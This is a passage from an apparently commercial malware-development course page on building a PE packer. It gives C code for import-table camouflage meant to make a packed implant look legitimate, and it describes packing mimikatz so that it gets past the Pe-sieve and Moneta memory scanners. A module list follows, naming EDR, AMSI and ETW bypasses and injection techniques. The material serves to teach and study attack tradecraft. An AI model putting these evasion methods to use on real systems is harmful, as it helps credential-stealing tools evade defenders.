    char* last_occurrence = NULL;  
    while (*str) {
        if (*str == c) {
            last_occurrence = (char*)str;  
        }
        str++;
    }

    return last_occurrence;
}
</code></pre>
<h3>IAT Camouflage</h3>
<p>Upon removing the CRT library, and especially when using API hashing,
 the implant's IAT will import very few functions over a few DLL 
modules. This can be used to identify a packed executable image as shown
 in the <em>IAT Camouflage</em> module. Therefore, using IAT camouflage,
 which is done by adding whitelisted APIs to the implant's IAT will make
 our implant look more legitimate.</p>
<p>When the <code>IatCamouflage</code> function below is invoked, the WinAPIs listed within it are added to its IAT.</p>
<pre><code class="language-C">VOID DummyAllocation(OUT DWORD* pdwRandNmbr) {

	*(DWORD*)pdwRandNmbr = *(DWORD*)pdwRandNmbr + GenerateRandomInt();

	if (*pdwRandNmbr &gt; 0x491fd3a1)
		return;

	DummyAllocation(pdwRandNmbr);
}



BOOL IatCamouflage() {

	DWORD	dwNmbr = 0x00;

	DummyAllocation(&amp;dwNmbr);

	if (dwNmbr &lt; 0xFFFFFF) {
		RegCloseKey(NULL);
		RegDeleteKeyExA(NULL, NULL, NULL, NULL);
		RegDeleteKeyExW(NULL, NULL, NULL, NULL);
		RegEnumKeyExA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegEnumKeyExW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegEnumValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegEnumValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegGetValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegGetValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegisterServiceCtrlHandlerA(NULL, NULL);
		RegisterServiceCtrlHandlerW(NULL, NULL);
		return !GetLastError();
	}

	return TRUE;
}
</code></pre>
<br>
<h3>Demo</h3>
<p>In this demo, <code>mimikatz.exe</code> will be packed and executed using the implementation built in this module:</p>
<ul>
<li>Compressing <code>mimikatz.exe</code> with <code>PeCompressor.exe</code> and outputting the <code>PeFileCompressed.lzw</code> file.</li>
</ul>
<img width="900px" style="margin:auto" alt="image" src="31_files/pepacker-376839836-809bbff7-192a-419f-8fdf-6dd41b8efa8e.png">
<ul>
<li>After replacing the <code>PeFileCompressed.lzw</code> file with the new one, compiling <code>PePacker</code> and running it will show <code>mimikatz</code>'s console.</li>
</ul>
<img width="900px" style="margin:auto" alt="image" src="31_files/pepacker-476840139-032e3a97-cd7a-4306-8a7b-5b730efbb9da.png">
<ul>
<li>Scanning <code>PePacker.exe</code> with <code>Pesieve</code> and successfully bypassing it even with maximum intensity scan flags.</li>
</ul>
<img width="900px" style="margin:auto" alt="image" src="31_files/pepacker-576840941-d4236333-9325-4eab-8484-212f3e5a0992.png">
<ul>
<li>Scanning <code>PePacker.exe</code> with <code>Moneta</code> and successfully bypassing it.</li>
</ul>
<img width="900px" style="margin:auto" alt="image" src="31_files/pepacker-676841231-fe531fdc-a0c3-4e5f-845f-a8e6c759ddf7.png">

    </div>

    
        
</div>              </div>
              
              <div id="accessory-container" class="flex flex-col h-full lg:min-w-[500px] w-[500px]">
    <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-full">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Use an alternative string hashing algorithm</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Save the initial payload size at the start of the PeFileCompressed.lzw file instead of saving it at the end</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Reduce the compressed payload entropy in the PePacker implant</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-3" data-objective-id="3" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Test the implant against memory scanner tools like Pe-sieve and Moneta</label>
                </div>
                                              
    </div>
    <div id="toc-container" class=" p-4 border-r border-b border-gray-600 w-full h-full">
    <div class="sticky top-0 bg-gray-800 rounded-xl">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg rounded-t-xl">
        Table of Contents
        </div>

        
        <div id="toc-skeleton" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2 ml-8 animate-pulse space-y-2">
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        </div>

        
        <div id="toc-content" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2">
        
        </div>
    </div>
    </div>

        <script>
    // If ToC starts open, build it once the DOM is ready
    document.addEventListener('DOMContentLoaded', function () {
        var el = document.getElementById('toc-content');
        if (el && !el.innerHTML.trim() && typeof extractHeadings === 'function') {
        extractHeadings();
        }
    });
    </script>
    
    <div id="maldevDB" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-full">
        <img class="w-[500px] mb-4" src="31_files/maldev-db-logo.png">
        <form id="searchForm" class="flex flex-col items-center justify-center w-full font-mono">
            <div class="relative flex w-full border border-solid border-gray-700 rounded-3xl">
            <i class="absolute fa fa-search text-gray-400 top-[14px] left-4 z-20"></i>
            <input placeholder="Search Maldev Database" type="search" name="q" autocomplete="off" id="searchInput" maxlength="85" class="relative m-0 -mr-0.5 h-[46px] w-full rounded-l-3xl  bg-transparent px-10 py-[0.25rem] font-normal leading-[1.6] text-white outline-none focus:bg-gray-800 focus:border-r focus:border-gray-700" aria-label="Search">
                <button class=" w-[70px] bg-gray-800 flex items-center justify-center rounded-r-3xl px-6 py-2.5 text-white hover:bg-gray-700" type="submit">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5">
                    <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="relative inline-block text-sm w-full md:w-fit">
                <select id="languageSelect" name="language" class="border rounded-md p-2.5 bg-gray-800 border-gray-600 placeholder-gray-400 text-white outline-none appearance-none w-full pr-8 my-4">
                    <option value="all" selected="selected">All languages</option>
                    <option value="c">C</option>
                    <option value="cpp">C++</option>
                    <option value="python">Python</option>
                    <option value="nim">Nim</option>
                    <option value="rust">Rust</option>
                    
                </select>
                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                    <svg class="h-4 w-4 text-gray-700" fill="#fff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
                        <path d="M5.516 7.548c.436-.446 1.045-.481 1.576 0L10 10.405l2.908-2.857c.531-.481 1.141-.446 1.576 0 .436.445.408 1.197 0 1.643l-3.564 3.642c-.214.223-.502.335-.92.335s-.707-.112-.92-.335l-3.564-3.642c-.408-.446-.436-1.198 0-1.643z"></path>
                    </svg>
                </div>
            </div>
        </form>
        <div class="resultsWrapper">
            <div id="noResults" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    No results found.
                </div>
            </div>
            <div id="rateLimited" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    HTTP 429 - You have been rate limited.
                </div>
            </div>

            <!-- Results here -->

            <div class="flex justify-center mt-6">
                <button id="loadMore" class="hidden bg-blue-700 text-white px-4 py-2 rounded hover:bg-blue-600 font-mono text-sm">
                    Load More
                </button>
            </div>
        </div>
    </div>
</div>
<div id="progress-container" class="hidden flex-col lg:min-w-[500px]">
    <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
    <div class="max-h-[300px]">
                <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">New Modules Progress</div>
                                    <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./1.html&amp;toc=true">
                    <div for="module-1" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 1 - Binary Metadata Modification
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./2.html&amp;toc=true">
                    <div for="module-2" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 2 - Thread Enumeration - NtQuerySystemInformation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./3.html&amp;toc=true">
                    <div for="module-3" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 3 - Custom WinAPI Functions
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./4.html&amp;toc=true">
                    <div for="module-4" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 4 - Exploiting EDRs For Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./5.html&amp;toc=true">
                    <div for="module-5" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 5 - Introduction To MASM Assembly
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./6.html&amp;toc=true">
                    <div for="module-6" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 6 - Evasion With File Bloating
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./7.html&amp;toc=true">
                    <div for="module-7" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 7 - Bring Your Own Protocol Handler
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./8.html&amp;toc=true">
                    <div for="module-8" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 8 - Bring Your Own File Extension
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./9.html&amp;toc=true">
                    <div for="module-9" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 9 - Utilizing Hardware Breakpoints For Hooking (1)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./10.html&amp;toc=true">
                    <div for="module-10" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 10 - Utilizing Hardware Breakpoints For Hooking (2)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./11.html&amp;toc=true">
                    <div for="module-11" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 11 - Utilizing Hardware Breakpoints For Credential Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./12.html&amp;toc=true">
                    <div for="module-12" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 12 - Event Tracing For Windows - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./13.html&amp;toc=true">
                    <div for="module-13" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 13 - Event Tracing For Windows - ETW Tools
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./14.html&amp;toc=true">
                    <div for="module-14" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 14 - Event Tracing For Windows - ETW Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./15.html&amp;toc=true">
                    <div for="module-15" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 15 - Event Tracing for Windows - Improved Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./16.html&amp;toc=true">
                    <div for="module-16" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 16 - Event Tracing for Windows - Patchless ETW Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./17.html&amp;toc=true">
                    <div for="module-17" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 17 - Event Tracing For Windows - ETW Provider Session Hijacking
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./18.html&amp;toc=true">
                    <div for="module-18" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 18 - Antimalware Scan Interface - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./19.html&amp;toc=true">
                    <div for="module-19" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 19 - Antimalware Scan Interface - AMSI Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./20.html&amp;toc=true">
                    <div for="module-20" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 20 - Antimalware Scan Interface - AMSI Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./21.html&amp;toc=true">
                    <div for="module-21" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 21 - Building a DRM-equipped Malware
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./22.html&amp;toc=true">
                    <div for="module-22" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 22 - Introduction to Havoc C&amp;C
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./23.html&amp;toc=true">
                    <div for="module-23" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 23 - Building An Evasive DLL Payload Loader
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./24.html&amp;toc=true">
                    <div for="module-24" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 24 - Introduction To DLL Sideloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./25.html&amp;toc=true">
                    <div for="module-25" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 25 - Practical DLL Sideloading Example
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./26.html&amp;toc=true">
                    <div for="module-26" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 26 - DLL Sideloading For EDR Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./27.html&amp;toc=true">
                    <div for="module-27" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 27 - Bring Your Own Vulnerable Driver
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./28.html&amp;toc=true">
                    <div for="module-28" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 28 - Local PE Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./29.html&amp;toc=true">
                    <div for="module-29" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 29 - Reflective DLL Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./30.html&amp;toc=true">
                    <div for="module-30" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 30 - PeFluctuation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./31.html&amp;toc=true">
                    <div for="module-31" class="ml-2 text-sm font-medium 
                                bg-blue-700 font-bold rounded-sm">
                        Module 31 - Building a PE Packer
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./32.html&amp;toc=true">
                    <div for="module-32" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 32 - Malware Directory Placement
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./33.html&amp;toc=true">
                    <div for="module-33" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 33 - Utilizing Fibers For Payload Execution
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./34.html&amp;toc=true">
                    <div for="module-34" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 34 - TLS Callbacks For Anti-Debugging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./35.html&amp;toc=true">
                    <div for="module-35" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 35 - Threadless Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./36.html&amp;toc=true">
                    <div for="module-36" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 36 - Module Stomping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./37.html&amp;toc=true">
                    <div for="module-37" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 37 - Module Overloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./38.html&amp;toc=true">
                    <div for="module-38" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 38 - Process Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./39.html&amp;toc=true">
                    <div for="module-39" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 39 - Ghost Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./40.html&amp;toc=true">
                    <div for="module-40" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 40 - Ghostly Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./41.html&amp;toc=true">
                    <div for="module-41" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 41 - Herpaderping Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./42.html&amp;toc=true">
                    <div for="module-42" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 42 - Herpaderply Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./43.html&amp;toc=true">
                    <div for="module-43" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 43 - Shellcode Reflective DLL Injection (sRDI)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./44.html&amp;toc=true">
                    <div for="module-44" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 44 - Patchless Threadless Injection Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./45.html&amp;toc=true">
                    <div for="module-45" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 45 - Tampered Syscalls Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./46.html&amp;toc=true">
                    <div for="module-46" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 46 - Exploiting EDRs For Evasion - Preventing EDR From Taking Action
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./47.html&amp;toc=true">
